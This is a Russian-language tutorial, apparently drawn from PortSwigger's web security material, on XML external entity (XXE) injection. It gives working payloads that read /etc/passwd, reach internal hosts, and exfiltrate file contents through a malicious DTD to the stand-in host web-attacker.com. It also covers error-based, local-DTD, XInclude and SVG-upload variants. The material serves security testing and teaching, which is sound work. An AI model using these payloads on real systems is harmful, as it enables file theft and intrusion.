[XXE injection](https://portswigger.net/web-security/xxe)

## Сущности XML
[XML entities](https://portswigger.net/web-security/xxe/xml-entities)
### Пользовательские сущности XML
XML позволяет определять пользовательские сущности в DTD (document type definition), Например:

	<!DOCTYPE foo [ <!ENTITY myentity "my entity value" > ]>

Это определение означает, что любое использование ссылки на сущность:

	&myentity;

в XML-документе будет заменено определенным значением: 

	"my entity value"

### Внешние сущности XML
Внешние сущности XML - это тип пользовательской сущности, определение которой находится за пределами DTD, в котором она объявлена.

При объявлении внешней сущности используется ключевое слово SYSTEM и должен быть указан URL, с которого должно быть загружено значение сущности, например:

	<!DOCTYPE foo [ <!ENTITY ext SYSTEM "http://normal-website.com" > ]>

URL может использовать протокол `file://`, и таким образом внешние сущности могут быть загружены из файла, например:

	<!DOCTYPE foo [ <!ENTITY ext SYSTEM "file:///path/to/file" > ]>

Внешние сущности XML обеспечивают основное средство, с помощью которого возникают атаки на внешние сущности XML (XXE-атаки).

## Типы XXE-атак
- Эксплуатация **XXE для получения файлов**, когда определяется внешняя сущность, содержащая содержимое файла, и возвращается в ответе приложения.
- Использование **XXE для выполнения SSRF-атак**, когда внешняя сущность определяется на основе URL-адреса к внутренней системе.
- Эксплуатация **слепого XXE для внеполосной эксфильтрации данных**, когда конфиденциальные данные передаются с сервера приложения на систему, которую контролирует злоумышленник.
- Использование **слепого XXE для получения данных через сообщения об ошибках**, когда злоумышленник может вызвать сообщение об ошибке парсинга, содержащее конфиденциальные данные.

## Эксплуатация XXE для получения файлов
Например, приложение для покупок проверяет уровень запасов продукта, отправляя на сервер следующий XML:

	<?xml version="1.0" encoding="UTF-8"?>
	<stockCheck><productId>381</productId></stockCheck>

Можно использовать уязвимость XXE для получения файла /etc/passwd, передав следующую полезную нагрузку XXE: 

	<?xml version="1.0" encoding="UTF-8"?>
	<!DOCTYPE foo [ <!ENTITY xxe SYSTEM "file:///etc/passwd"> ]>
	<stockCheck><productId>&xxe;</productId></stockCheck>

В реальном мире XXE-уязвимости часто содержат большое количество значений данных в представленном XML, любое из которых может быть использовано в ответе приложения. Для систематического тестирования на XXE-уязвимости, как правило, необходимо проверить каждый узел данных в XML по отдельности, используя определенную сущность и проверяя, появляется ли она в ответе.

## Эскплуатация XXE для проведения атак SSRF
В следующем примере XXE внешний объект заставит сервер выполнить внутренний HTTP-запрос к внутренней системе в инфраструктуре организации:

	<!DOCTYPE foo [ <!ENTITY xxe SYSTEM "http://internal.vulnerable-website.com/"> ]>

## Слепые XXE
[Finding and exploiting blind XXE vulnerabilities](https://portswigger.net/web-security/xxe/blind)
### Обнаружение слепых XXE с помощью внеполосных методов (OAST)
Часто можно обнаружить слепой XXE, используя ту же технику, что и для атак XXE SSRF, но инициируя внеполосное сетевое (out-of-band) взаимодействие с подконтрольной системой:

	<!DOCTYPE foo [ <!ENTITY xxe SYSTEM "http://f2g9j7hhkax.web-attacker.com"> ]>

Эта XXE-атака заставляет сервер выполнить внутренний HTTP-запрос к указанному URL. Атакующий может проследить за результирующим DNS-поиском и HTTP-запросом и таким образом обнаружить, что XXE-атака была успешной.

Иногда XXE-атаки с использованием обычных сущностей блокируются из-за некоторой проверки ввода приложением или некоторого ужесточения используемого парсера XML. В такой ситуации вместо них можно использовать сущности параметров XML. Сущности параметров XML - это особый вид сущностей XML, на которые можно ссылаться только в других местах DTD. Для настоящих целей вам нужно знать только две вещи. Во-первых, объявление сущности параметра XML включает символ процента перед именем сущности:

	<!ENTITY % myparameterentity "my parameter entity value" >

Ссылки на сущности параметров:

	%myparameterentity;

Например:

	<!DOCTYPE foo [ <!ENTITY % xxe SYSTEM "http://f2g9j7hhkax.web-attacker.com"> %xxe; ]>

Эта полезная нагрузка XXE объявляет сущность параметра XML под названием `xxe`, а затем использует эту сущность в DTD. Это вызовет поиск DNS и HTTP-запрос к домену атакующего, что подтвердит успешность атаки. 

### Эксплуатация слепого XXE для внеполосной утечки данных
Пример вредоносного DTD для эксфильтрации содержимого файла `/etc/passwd` выглядит следующим образом:

	<!ENTITY % file SYSTEM "file:///etc/passwd">
	<!ENTITY % eval "<!ENTITY &#x25; exfiltrate SYSTEM 'http://web-attacker.com/?x=%file;'>">
	%eval;
	%exfiltrate;

_Unicode Hex Character Code:_

	&#x25; == %

Этот DTD выполняет следующие действия:
- Определяет сущность параметра XML под названием `file`, содержащий содержимое файла `/etc/passwd`.
- Определяет сущность параметра XML под названием `eval`, содержащий динамическое объявление другой сущности `exfiltrate`. Сущность `exfiltrate` будет оценена при выполнении HTTP-запроса к веб-серверу злоумышленника, содержащего значение сущности `file` в строке запроса URL.
- Использует сущность `eval`, которая вызывает динамическое объявление сущности `exfiltrate`.
- Использует сущность `exfiltrate`, так что ее значение оценивается при запросе указанного URL.

Например, злоумышленник может разместить вредоносный DTD по следующему URL:

	`http://web-attacker.com/malicious.dtd`

Наконец, злоумышленник должен передать следующую XXE полезную нагрузку в уязвимое приложение:

	<!DOCTYPE foo [<!ENTITY % xxe SYSTEM "http://web-attacker.com/malicious.dtd"> %xxe;]>

Эта техника может не работать с некоторым содержимым файлов, включая символы новой строки, содержащиеся в файле `/etc/passwd`. Это связано с тем, что некоторые анализаторы XML получают URL-адрес в определении внешней сущности с помощью API, который проверяет символы, разрешенные для появления в URL-адресе. В этой ситуации можно использовать протокол FTP вместо HTTP. Иногда невозможно передать данные, содержащие символы новой строки, поэтому вместо них можно использовать такой файл, как `/etc/hostname`.

### Эксплуатация слепого XXE для получения данных через сообщения об ошибках
Можно вызвать сообщение об ошибке при разборе XML, содержащее содержимое файла `/etc/passwd`, используя вредоносный внешний DTD следующим образом:

	<!ENTITY % file SYSTEM "file:///etc/passwd">
	<!ENTITY % eval "<!ENTITY &#x25; error SYSTEM 'file:///nonexistent/%file;'>">
	%eval;
	%error;

Этот DTD выполняет следующие действия:
- Определяет сущность параметра XML под названием `file`, содержащий содержимое файла `/etc/passwd`.
- Определяет сущность параметра XML под названием `eval`, содержащий динамическое объявление другой сущности под названием `error`. Сущность `error` будет оцениваться при загрузке несуществующего файла, имя которого содержит значение сущности `file`.
- Использует сущность `eval`, которая вызывает динамическое объявление сущности `error`.
- Использует сущность `error`, так что ее значение оценивается при попытке загрузить несуществующий файл, в результате чего выдается сообщение об ошибке с именем несуществующего файла, которое является содержимым файла `/etc/passwd`.

### Эксплуатация слепого XXE путем перепрофилирования локального DTD
Как же быть со слепыми XXE-уязвимостями, когда блокируется внеполосное взаимодействие? Вы не можете переправить данные через внеполосное соединение, и вы не можете загрузить внешний DTD с удаленного сервера.

В этой ситуации все же возможно вызвать сообщения об ошибках, содержащие конфиденциальные данные, благодаря лазейке в спецификации языка XML. Если в DTD документа используется гибрид внутренних и внешних DTD-деклараций, то внутренний DTD может переопределять сущности, которые объявлены во внешнем DTD. Когда это происходит, ограничение на использование сущности параметра XML в определении другой сущности параметра ослабевает.

Это означает, что злоумышленник может использовать технику XXE на основе ошибок из внутреннего DTD, если используемая им сущность параметра XML переопределяет сущность, объявленную во внешнем DTD. Конечно, если внеполосные соединения заблокированы, то внешний DTD не может быть загружен с удаленного места. Вместо этого, это должен быть внешний DTD-файл, локальный для сервера приложений. По сути, атака заключается в вызове DTD-файла, который случайно существует в локальной файловой системе, и его перепрофилировании для переопределения существующей сущности таким образом, чтобы вызвать ошибку синтаксического анализа, содержащую конфиденциальные данные.

Например, в файловой системе сервера есть DTD-файл в месте `/usr/local/app/schema.dtd`, и этот DTD-файл определяет сущность под названием `custom_entity`. Злоумышленник может вызвать сообщение об ошибке разбора XML, содержащее содержимое файла `/etc/passwd`, представив гибридный DTD следующим образом: 

	<!DOCTYPE foo [
	<!ENTITY % local_dtd SYSTEM "file:///usr/local/app/schema.dtd">
	<!ENTITY % custom_entity '
	<!ENTITY &#x25; file SYSTEM "file:///etc/passwd">
	<!ENTITY &#x25; eval "<!ENTITY &#x26;#x25; error SYSTEM &#x27;file:///nonexistent/&#x25;file;&#x27;>">
	&#x25;eval;
	&#x25;error;
	'>
	%local_dtd;
	]>

_Unicode Hex Character Codes:_

	&#x26; == &
	&#x27; == '

Этот DTD выполняет следующие действия:
- Определяет сущность параметра XML под названием `local_dtd`, содержащую содержимое внешнего файла DTD, который существует в файловой системе сервера.
- Переопределяет сущность параметра XML под названием `custom_entity`, которая уже определена во внешнем файле DTD. Сущность переопределена как содержащая уже описанный XXE-эксплойт, основанный на ошибке, для вызова сообщения об ошибке, содержащего содержимое файла `/etc/passwd`.
- Используется сущность `local_dtd`, так что внешний DTD интерпретируется, включая переопределенное значение сущности `custom_entity`. Это приводит к желаемому сообщению об ошибке.

### Нахождение существующего DTD-файла для перепрофилирования
Поскольку эта XXE-атака предполагает переиспользование существующего DTD в файловой системе сервера, ключевым требованием является поиск подходящего файла. На самом деле это довольно просто. Поскольку приложение возвращает все сообщения об ошибках, выдаваемые парсером XML, вы можете легко перечислить локальные файлы DTD, просто попытавшись загрузить их из внутреннего DTD.

Например, системы Linux, использующие среду рабочего стола GNOME, часто имеют DTD-файл по адресу `/usr/share/yelp/dtd/docbookx.dtd`. Вы можете проверить наличие этого файла, отправив следующую полезную нагрузку XXE, которая приведет к ошибке, если файл отсутствует: 

	<!DOCTYPE foo [
	<!ENTITY % local_dtd SYSTEM "file:///usr/share/yelp/dtd/docbookx.dtd">
	%local_dtd;
	]>

После того как вы проверили список распространенных DTD-файлов, чтобы найти присутствующий файл, вам нужно получить копию этого файла и просмотреть его, чтобы найти сущность, которую можно переопределить. Поскольку многие распространенные системы, включающие файлы DTD, имеют открытый исходный код, вы обычно можете быстро получить копию файлов через поиск в Интернете.

## Поиск скрытой поверхности атаки для XXE-инъекции
### Атаки XInclude
Некоторые приложения получают данные, переданные клиентом, вставляют их на стороне сервера в XML-документ, а затем разбирают этот документ. Примером может служить ситуация, когда переданные клиентом данные помещаются в внутренний SOAP-запрос, который затем обрабатывается внутренней SOAP-службой.

В этой ситуации вы не можете осуществить классическую XXE-атаку, поскольку вы не контролируете весь XML-документ и поэтому не можете определить или изменить элемент `DOCTYPE`. Однако вместо этого вы можете использовать `XInclude`. `XInclude` - это часть спецификации XML, которая позволяет создавать XML-документ из поддокументов. Атаку `XInclude` можно поместить в любое значение данных в XML-документе, поэтому атака может быть выполнена в ситуациях, когда вы контролируете только один элемент данных, помещенный в XML-документ на стороне сервера.

Чтобы выполнить атаку XInclude, необходимо обратиться к пространству имен XInclude и указать путь к файлу, который вы хотите включить. Например:

	<foo xmlns:xi="http://www.w3.org/2001/XInclude">
	<xi:include parse="text" href="file:///etc/passwd"/></foo>

В запросе можно использовать кодирование URL:

	productId=%3c%66%6f%6f%20%78%6d%6c%6e%73%3a%78%69%3d%22%68%74%74%70%3a%2f%2f%77%77%77%2e%77%33%2e%6f%72%67%2f%32%30%30%31%2f%58%49%6e%63%6c%75%64%65%22%3e%3c%78%69%3a%69%6e%63%6c%75%64%65%20%70%61%72%73%65%3d%22%74%65%78%74%22%20%68%72%65%66%3d%22%66%69%6c%65%3a%2f%2f%2f%65%74%63%2f%70%61%73%73%77%64%22%2f%3e%3c%2f%66%6f%6f%3e

### XXE-атаки через загрузку файлов
Некоторые приложения позволяют пользователям загружать файлы, которые затем обрабатываются на стороне сервера. Некоторые распространенные форматы файлов используют XML или содержат подкомпоненты XML. Примерами форматов на основе XML являются форматы офисных документов, например DOCX, и форматы изображений, например SVG.

Например, приложение может позволять пользователям загружать изображения и обрабатывать или проверять их на сервере после загрузки. Даже если приложение ожидает получить формат PNG или JPEG, используемая библиотека обработки изображений может поддерживать изображения SVG. Поскольку формат SVG использует XML, злоумышленник может отправить вредоносное изображение SVG и таким образом достичь скрытой поверхности атаки для уязвимостей XXE.

	<?xml version="1.0" standalone="yes"?>
	<!DOCTYPE test [ <!ENTITY xxe SYSTEM "file:///etc/hostname" > ]>
	<svg width="512px" height="512px" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink" version="1.1">
	<text font-size="38" x="0" y="38">&xxe;</text>
	</svg>

Обратите внимание, что первая строка файла чтения или результата выполнения появится внутри созданного изображения. Поэтому необходимо иметь доступ к изображению, которое создал SVG.

### XXE-атаки через измененный Content-Type
Большинство POST-запросов используют тип содержимого по умолчанию, который генерируется HTML-формами, например `application/x-www-form-urlencoded`. Некоторые веб-сайты ожидают получать запросы в этом формате, но допускают другие типы содержимого, включая XML.

Например, если обычный запрос содержит следующее:

	POST /action HTTP/1.0
	Content-Type: application/x-www-form-urlencoded
	Content-Length: 7
	
	foo=bar

Тогда вы можете отправить следующий запрос с тем же результатом:

	POST /action HTTP/1.0
	Content-Type: text/xml
	Content-Length: 52
	
	<?xml version="1.0" encoding="UTF-8"?><foo>bar</foo>

## Как найти и протестировать XXE-уязвимости
Подавляющее большинство XXE-уязвимостей можно быстро и надежно найти с помощью сканера веб-уязвимостей Burp Suite.

Ручное тестирование на наличие XXE-уязвимостей обычно включает в себя:
- Тестирование на получение файла путем определения внешней сущности на основе известного файла операционной системы и использования этой сущности в данных, которые возвращаются в ответе приложения.
- Тестирование на слепые XXE-уязвимости путем определения внешней сущности на основе URL-адреса системы, которую вы контролируете, и мониторинга взаимодействия с этой системой. Клиент Burp Collaborator идеально подходит для этой цели.
- Тестирование уязвимости включения пользовательских не XML-данных в XML-документ на стороне сервера с помощью атаки XInclude для попытки получить известный файл операционной системы.

